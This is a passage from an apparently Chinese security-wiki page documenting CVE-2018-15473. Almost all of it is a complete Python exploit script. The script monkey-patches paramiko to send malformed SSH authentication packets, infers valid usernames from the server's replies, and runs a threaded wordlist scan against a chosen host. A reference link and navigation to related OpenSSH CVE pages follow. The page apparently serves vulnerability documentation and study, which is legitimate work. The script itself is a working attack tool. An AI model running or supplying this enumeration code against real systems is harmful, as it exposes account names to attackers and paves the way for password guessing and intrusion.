        <span class="k">return</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">boldstr</span><span class="si">}{</span><span class="n">colorstr</span><span class="si">}{</span><span class="n">string</span><span class="si">}{</span><span class="n">Color</span><span class="o">.</span><span class="n">ENDC</span><span class="si">}</span><span class="s1">&#39;</span>


<span class="k">class</span><span class="w"> </span><span class="nc">InvalidUsername</span><span class="p">(</span><span class="ne">Exception</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot; Raise when username not found via CVE-2018-15473. &quot;&quot;&quot;</span>


<span class="k">def</span><span class="w"> </span><span class="nf">apply_monkey_patch</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot; Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.</span>
<span class="sd">        patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict</span>
<span class="sd">            _parse_service_accept</span>
<span class="sd">            _parse_userauth_failure</span>
<span class="sd">        _handler_table = {</span>
<span class="sd">            MSG_SERVICE_REQUEST: _parse_service_request,</span>
<span class="sd">            MSG_SERVICE_ACCEPT: _parse_service_accept,</span>
<span class="sd">            MSG_USERAUTH_REQUEST: _parse_userauth_request,</span>
<span class="sd">            MSG_USERAUTH_SUCCESS: _parse_userauth_success,</span>
<span class="sd">            MSG_USERAUTH_FAILURE: _parse_userauth_failure,</span>
<span class="sd">            MSG_USERAUTH_BANNER: _parse_userauth_banner,</span>
<span class="sd">            MSG_USERAUTH_INFO_REQUEST: _parse_userauth_info_request,</span>
<span class="sd">            MSG_USERAUTH_INFO_RESPONSE: _parse_userauth_info_response,</span>
<span class="sd">        }</span>
<span class="sd">    &quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">patched_add_boolean</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot; Override correct behavior of paramiko.message.Message.add_boolean, used to produce malformed packets. &quot;&quot;&quot;</span>

    <span class="n">auth_handler</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">auth_handler</span><span class="o">.</span><span class="n">AuthHandler</span>
    <span class="n">old_msg_service_accept</span> <span class="o">=</span> <span class="n">auth_handler</span><span class="o">.</span><span class="n">_client_handler_table</span><span class="p">[</span><span class="n">paramiko</span><span class="o">.</span><span class="n">common</span><span class="o">.</span><span class="n">MSG_SERVICE_ACCEPT</span><span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">patched_msg_service_accept</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot; Patches paramiko.message.Message.add_boolean to produce a malformed packet. &quot;&quot;&quot;</span>
        <span class="n">old_add_boolean</span><span class="p">,</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">message</span><span class="o">.</span><span class="n">Message</span><span class="o">.</span><span class="n">add_boolean</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">message</span><span class="o">.</span><span class="n">Message</span><span class="o">.</span><span class="n">add_boolean</span><span class="p">,</span> <span class="n">patched_add_boolean</span>
        <span class="n">retval</span> <span class="o">=</span> <span class="n">old_msg_service_accept</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
        <span class="n">paramiko</span><span class="o">.</span><span class="n">message</span><span class="o">.</span><span class="n">Message</span><span class="o">.</span><span class="n">add_boolean</span> <span class="o">=</span> <span class="n">old_add_boolean</span>
        <span class="k">return</span> <span class="n">retval</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">patched_userauth_failure</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot; Called during authentication when a username is not found. &quot;&quot;&quot;</span>
        <span class="k">raise</span> <span class="n">InvalidUsername</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>

    <span class="n">auth_handler</span><span class="o">.</span><span class="n">_client_handler_table</span><span class="o">.</span><span class="n">update</span><span class="p">({</span>
        <span class="n">paramiko</span><span class="o">.</span><span class="n">common</span><span class="o">.</span><span class="n">MSG_SERVICE_ACCEPT</span><span class="p">:</span> <span class="n">patched_msg_service_accept</span><span class="p">,</span>
        <span class="n">paramiko</span><span class="o">.</span><span class="n">common</span><span class="o">.</span><span class="n">MSG_USERAUTH_FAILURE</span><span class="p">:</span> <span class="n">patched_userauth_failure</span>
    <span class="p">})</span>


<span class="k">def</span><span class="w"> </span><span class="nf">create_socket</span><span class="p">(</span><span class="n">hostname</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Union</span><span class="p">[</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">,</span> <span class="kc">None</span><span class="p">]:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot; Small helper to stay DRY.</span>
<span class="sd">    Returns:</span>
<span class="sd">        socket.socket or None</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="c1"># spoiler alert, I don&#39;t care about the -6 flag, it&#39;s really</span>
    <span class="c1"># just to advertise in the help that the program can handle ipv6</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;socket error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">connect</span><span class="p">(</span><span class="n">username</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">hostname</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">verbose</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot; Connect and attempt keybased auth, result interpreted to determine valid username.</span>
<span class="sd">    Args:</span>
<span class="sd">        username:   username to check against the ssh service</span>
<span class="sd">        hostname:   hostname/IP of target</span>
<span class="sd">        port:       port where ssh is listening</span>
<span class="sd">        key:        key used for auth</span>
<span class="sd">        verbose:    bool value; determines whether to print &#39;not found&#39; lines or not</span>
<span class="sd">    Returns:</span>
<span class="sd">        None</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="n">sock</span> <span class="o">=</span> <span class="n">create_socket</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">sock</span><span class="p">:</span>
        <span class="k">return</span>

    <span class="n">transport</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">transport</span><span class="o">.</span><span class="n">Transport</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">transport</span><span class="o">.</span><span class="n">start_client</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">ssh_exception</span><span class="o">.</span><span class="n">SSHException</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">print</span><span class="p">(</span><span class="n">Color</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[!] SSH negotiation failed for user </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s1">.&#39;</span><span class="p">,</span> <span class="n">color</span><span class="o">=</span><span class="s1">&#39;red&#39;</span><span class="p">))</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">transport</span><span class="o">.</span><span class="n">auth_publickey</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">RSAKey</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
    <span class="k">except</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">ssh_exception</span><span class="o">.</span><span class="n">AuthenticationException</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] </span><span class="si">{</span><span class="n">Color</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">color</span><span class="o">=</span><span class="s1">&#39;yellow&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2"> found!&quot;</span><span class="p">)</span>
    <span class="k">except</span> <span class="n">InvalidUsername</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">verbose</span><span class="p">:</span>
            <span class="k">return</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[-] </span><span class="si">{</span><span class="n">Color</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">color</span><span class="o">=</span><span class="s2">&quot;red&quot;</span><span class="p">)</span><span class="si">}</span><span class="s1"> not found&#39;</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot; main entry point for the program &quot;&quot;&quot;</span>
    <span class="n">sock</span> <span class="o">=</span> <span class="n">create_socket</span><span class="p">(</span><span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;hostname&#39;</span><span class="p">),</span> <span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;port&#39;</span><span class="p">))</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">sock</span><span class="p">:</span>
        <span class="k">return</span>

    <span class="n">banner</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

    <span class="n">regex</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;-OpenSSH_(?P&lt;version&gt;\d\.\d)&#39;</span><span class="p">,</span> <span class="n">banner</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">regex</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">version</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="n">regex</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="s1">&#39;version&#39;</span><span class="p">))</span>
        <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[!] Attempted OpenSSH version detection; version not recognized.</span><span class="se">\n</span><span class="s1">[!] Found: </span><span class="si">{</span><span class="n">regex</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="s2">&quot;version&quot;</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">ver_clr</span> <span class="o">=</span> <span class="s1">&#39;green&#39;</span> <span class="k">if</span> <span class="n">version</span> <span class="o">&lt;=</span> <span class="mf">7.7</span> <span class="k">else</span> <span class="s1">&#39;red&#39;</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] </span><span class="si">{</span><span class="n">Color</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="s1">&#39;OpenSSH&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">color</span><span class="o">=</span><span class="n">ver_clr</span><span class="p">)</span><span class="si">}</span><span class="s2"> version </span><span class="si">{</span><span class="n">Color</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="n">version</span><span class="p">,</span><span class="w"> </span><span class="n">color</span><span class="o">=</span><span class="n">ver_clr</span><span class="p">)</span><span class="si">}</span><span class="s2"> found&quot;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[!] Attempted OpenSSH version detection; version not recognized.</span><span class="se">\n</span><span class="s1">[!] Found: </span><span class="si">{</span><span class="n">Color</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="n">banner</span><span class="p">,</span><span class="w"> </span><span class="n">color</span><span class="o">=</span><span class="s2">&quot;yellow&quot;</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">apply_monkey_patch</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">):</span>
        <span class="n">kwargs</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">connect</span><span class="p">(</span><span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>

    <span class="k">with</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Pool</span><span class="p">(</span><span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;threads&#39;</span><span class="p">))</span> <span class="k">as</span> <span class="n">pool</span><span class="p">,</span> <span class="n">Path</span><span class="p">(</span><span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;wordlist&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">open</span><span class="p">()</span> <span class="k">as</span> <span class="n">usernames</span><span class="p">:</span>
        <span class="n">host</span> <span class="o">=</span> <span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;hostname&#39;</span><span class="p">)</span>
        <span class="n">port</span> <span class="o">=</span> <span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;port&#39;</span><span class="p">)</span>
        <span class="n">verbose</span> <span class="o">=</span> <span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;verbose&#39;</span><span class="p">)</span>
        <span class="n">pool</span><span class="o">.</span><span class="n">starmap</span><span class="p">(</span><span class="n">connect</span><span class="p">,</span> <span class="p">[(</span><span class="n">user</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">verbose</span><span class="p">)</span> <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">usernames</span><span class="p">])</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">&quot;OpenSSH Username Enumeration (CVE-2018-15473)&quot;</span><span class="p">)</span>

    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;hostname&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;target to enumerate&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;--port&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;ssh port (default: 22)&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">22</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="s1">&#39;--threads&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;number of threads (default: 4)&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-v&#39;</span><span class="p">,</span> <span class="s1">&#39;--verbose&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_true&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
                        <span class="n">help</span><span class="o">=</span><span class="s2">&quot;print both valid and invalid usernames (default: False)&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-6&#39;</span><span class="p">,</span> <span class="s1">&#39;--ipv6&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_true&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Specify use of an ipv6 address (default: ipv4)&quot;</span><span class="p">)</span>

    <span class="n">multi_or_single_group</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">add_mutually_exclusive_group</span><span class="p">(</span><span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">multi_or_single_group</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-w&#39;</span><span class="p">,</span> <span class="s1">&#39;--wordlist&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;path to wordlist&quot;</span><span class="p">)</span>
    <span class="n">multi_or_single_group</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-u&#39;</span><span class="p">,</span> <span class="s1">&#39;--username&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;a single username to test&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="s1">&#39;paramiko.transport&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">addHandler</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">NullHandler</span><span class="p">())</span>

    <span class="n">main</span><span class="p">(</span><span class="o">**</span><span class="nb">vars</span><span class="p">(</span><span class="n">args</span><span class="p">))</span>
</code></pre></div>

<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://www.freebuf.com/vuls/184583.html">https://www.freebuf.com/vuls/184583.html</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2020-15778%EF%BC%89OpenSSH%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2020-15778%EF%BC%89OpenSSH%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-15778）OpenSSH 命令注入漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../OpenSSH-ProxyCommand%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-%28CVE-2023-51385%29/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../OpenSSH-ProxyCommand%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-%28CVE-2023-51385%29/" class="btn btn-xs btn-link">
        OpenSSH ProxyCommand命令注入漏洞 (CVE 2023 51385)
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>